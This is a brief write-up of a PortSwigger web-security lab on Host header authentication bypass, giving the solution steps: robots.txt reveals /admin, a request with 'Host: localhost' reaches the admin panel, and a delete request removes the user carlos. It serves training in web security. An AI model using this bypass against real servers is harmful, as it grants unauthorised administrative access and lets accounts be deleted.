# Lab 02 — Host header authentication bypass

> **Apprentice** · [Official lab](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass)

**Entry point:** `/admin` allows **local users only** — and "local" is
decided by the Host header.

## Solution

1. `robots.txt` reveals `/admin`; direct access → "local users only".
2. In Repeater:

```http
GET /admin HTTP/1.1
Host: localhost
```

3. The panel loads — delete carlos via
   `GET /admin/delete?username=carlos` — lab solved.
